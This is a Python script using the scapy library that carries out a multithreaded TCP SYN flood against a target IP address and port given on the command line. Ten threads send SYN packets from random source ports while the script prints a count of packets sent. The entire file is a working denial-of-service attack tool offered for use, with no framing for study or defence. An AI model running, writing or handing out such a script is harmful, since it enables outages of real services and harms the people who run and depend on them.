import sys
import threading
import random
import scapy.all as scapy

# Global Params
target_ip = ''
target_port = 80  # Default HTTP port
request_counter = 0
stop_attack = False

def inc_counter():
    global request_counter
    request_counter += 1

def attack_target():
    global stop_attack
    while not stop_attack:
        # Create a random source port
        src_port = random.randint(1024, 65535)
        
        # TCP SYN Flood
        packet = scapy.IP(dst=target_ip) / scapy.TCP(sport=src_port, dport=target_port, flags='S')
        scapy.send(packet, verbose=0)
        inc_counter()
        
        # Optional: Sleep to control rate of attack
        # time.sleep(0.01)

def usage():
    print('---------------------------------------------------')
    print('USAGE: python root.py <target_ip> [<target_port>]')
    print('---------------------------------------------------')

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    else:
        target_ip = sys.argv[1]
        if len(sys.argv) == 3:
            target_port = int(sys.argv[2])
        
        print(f"Starting attack on {target_ip}:{target_port}")
        
        try:
            # Start multiple threads to increase attack intensity
            for i in range(10):  # Adjust the number of threads based on desired intensity
                t = threading.Thread(target=attack_target)
                t.start()
                
            # Monitor attack
            while True:
                print(f"Requests Sent: {request_counter}")
                # Optional: Add conditions to stop attack
                # time.sleep(10)
        except KeyboardInterrupt:
            stop_attack = True
            print("Attack stopped.")
